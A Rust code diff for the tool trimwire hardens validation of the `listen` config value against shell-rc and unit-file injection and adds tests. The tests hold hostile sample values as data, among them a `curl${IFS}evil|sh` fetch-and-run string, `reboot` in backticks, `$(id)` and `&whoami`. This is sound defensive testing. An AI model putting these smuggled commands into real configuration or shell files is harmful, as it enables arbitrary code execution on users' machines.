@@ -1026,31 +1026,34 @@ impl Config {
             }
         }
 
-        // `listen` is interpolated into generated shell-rc exports and service unit
-        // files (`install`). A host:port never contains whitespace/control chars, so
-        // reject any that do — otherwise a newline could append extra `export`/unit
-        // lines (shell-rc injection from a project `./.trimwire.toml`). Fall back to
-        // the trusted value.
-        if cfg
-            .server
-            .listen
-            .chars()
-            .any(|c| c.is_whitespace() || c.is_control())
-        {
+        // `listen` is interpolated into generated shell-rc exports (unquoted-historically)
+        // AND systemd `.socket` / launchd unit files by `install`. A valid host:port only
+        // ever contains `[0-9A-Za-z]`, `.`/`:`/`-` and IPv6 brackets `[]` (plus `_` for
+        // some hostnames) — so we ALLOWLIST that set and reject anything else. This blocks
+        // shell-rc injection from a project `./.trimwire.toml` (e.g. `listen` smuggling
+        // `;`, `|`, `$`, backticks, `${IFS}`, or a newline to append extra `export`/unit
+        // lines). Whitespace/control chars are excluded by the allowlist too. Fall back to
+        // the trusted value (global config / `TRIMWIRE_*` env), then the built-in default.
+        // (`/` is intentionally NOT allowed: callers add the `http://` scheme prefix AFTER
+        // this validation, so a valid host:port never needs a slash.)
+        let is_unsafe_listen = |s: &str| {
+            s.is_empty()
+                || s.chars().any(|c| {
+                    !(c.is_ascii_alphanumeric() || matches!(c, ':' | '.' | '-' | '[' | ']' | '_'))
+                })
+        };
+        if is_unsafe_listen(&cfg.server.listen) {
             let trusted_listen: String = trusted
                 .extract_inner("server.listen")
                 .unwrap_or_else(|_| Config::default().server.listen);
-            let safe_listen = if trusted_listen
-                .chars()
-                .any(|c| c.is_whitespace() || c.is_control())
-            {
+            let safe_listen = if is_unsafe_listen(&trusted_listen) {
                 Config::default().server.listen
             } else {
                 trusted_listen
             };
             eprintln!(
-                "[trimwire] ignoring `listen` with whitespace/control characters \
-                 (not a valid host:port); using {safe_listen}"
+                "[trimwire] ignoring `listen` with characters not valid in a host:port \
+                 (only [0-9A-Za-z], `.:-[]_` allowed); using {safe_listen}"
             );
             cfg.server.listen = safe_listen;
         }
@@ -1919,6 +1922,94 @@ fallback = ["ghost-provider"]
             assert!(
                 !cfg.server.listen.chars().any(|c| c.is_control()),
                 "no control chars survive into listen"
+            );
+            Ok(())
+        });
+    }
+
+    #[test]
+    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
+    fn load_rejects_listen_with_shell_metacharacters() {
+        // P1-1: a project ./.trimwire.toml `listen` with NO whitespace but shell
+        // metacharacters (`;`, `|`, `$`, `${IFS}`, backticks) used to pass the old
+        // whitespace/control-only filter and land UNQUOTED in the shell rc on
+        // `trimwire install` → arbitrary code execution on next shell. The charset
+        // allowlist must reject these and fall back to the trusted/default value.
+        for hostile in [
+            "127.0.0.1:8765;curl${IFS}evil|sh",
+            "127.0.0.1:8765`reboot`",
+            "127.0.0.1:8765$(id)",
+            "127.0.0.1:8765&whoami",
+            // single-quote: the char that would break OUT of the rc export's quoting
+            "127.0.0.1:8765'evil'",
+        ] {
+            figment::Jail::expect_with(|jail| {
+                jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
+                jail.create_file(
+                    ".trimwire.toml",
+                    &format!("[server]\nlisten = {hostile:?}\n"),
+                )?;
+                let cfg = Config::load().expect("load");
+                assert_eq!(
+                    cfg.server.listen, "127.0.0.1:8765",
+                    "hostile listen {hostile:?} must revert to the trusted/default value"
+                );
+                assert!(
+                    !cfg.server.listen.chars().any(|c| matches!(
+                        c,
+                        ';' | '|' | '$' | '`' | '&' | '(' | ')' | '{' | '}' | '<' | '>'
+                    )),
+                    "no shell metacharacters survive into listen"
+                );
+                Ok(())
+            });
+        }
+    }
+
+    #[test]
+    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
+    fn load_accepts_valid_ipv6_and_hostname_listen() {
+        // The allowlist must NOT reject legitimate host:port values (IPv6 brackets,
+        // hostnames with dashes/underscores).
+        for ok in ["[::1]:8765", "localhost:8765", "my-host_1:9000"] {
+            figment::Jail::expect_with(|jail| {
+                jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
+                jail.create_file(".trimwire.toml", &format!("[server]\nlisten = {ok:?}\n"))?;
+                let cfg = Config::load().expect("load");
+                assert_eq!(
+                    cfg.server.listen, ok,
+                    "valid listen {ok:?} must be preserved"
+                );
+                Ok(())
+            });
+        }
+    }
+
+    #[test]
+    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
+    fn load_revalidates_hostile_trusted_env_listen() {
+        // The fallback target (trusted global/env tier) is re-validated too: a hostile
+        // TRIMWIRE_SERVER__LISTEN must NOT become the "safe" fallback — it drops to the
+        // built-in default. But a VALID env listen IS honored over a hostile project one.
+        figment::Jail::expect_with(|jail| {
+            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
+            jail.set_env("TRIMWIRE_SERVER__LISTEN", "127.0.0.1:9999;evil");
+            jail.create_file(".trimwire.toml", "[server]\nlisten = \"0.0.0.0:1$(x)\"\n")?;
+            let cfg = Config::load().expect("load");
+            assert_eq!(
+                cfg.server.listen, "127.0.0.1:8765",
+                "hostile env fallback must drop to the built-in default, not the hostile env value"
+            );
+            Ok(())
+        });
+        figment::Jail::expect_with(|jail| {
+            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
+            jail.set_env("TRIMWIRE_SERVER__LISTEN", "127.0.0.1:9000");
+            jail.create_file(".trimwire.toml", "[server]\nlisten = \"0.0.0.0:1$(x)\"\n")?;
+            let cfg = Config::load().expect("load");
+            assert_eq!(
+                cfg.server.listen, "127.0.0.1:9000",
+                "a valid trusted env listen is honored over a hostile project value"
             );
             Ok(())
         });
